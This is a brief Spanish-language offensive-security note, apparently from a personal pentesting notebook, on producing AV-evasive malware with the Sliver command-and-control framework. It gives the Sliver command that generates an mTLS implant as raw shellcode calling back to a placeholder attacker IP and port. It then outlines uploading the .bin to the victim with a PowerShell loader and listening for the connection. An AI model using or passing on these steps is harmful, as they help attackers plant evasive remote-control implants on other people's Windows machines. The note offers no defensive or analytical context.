#window #persistencia #window_evasion #sliver #c2 #command_and_control 


Crearemos un malware pero en shellcode (código maquina) esto hace que sea mas difícil de detectar por el antivirus

```bash
sliver>generate --mtls ip_attacker:port --arch amd64 --format shellcode --save shelcode 
```

Subimos el .bin a la maquina junto con un código de powershell para ejecutarlo

Y nos ponemos a escuchar con sliver y ejecutamos el script de powershell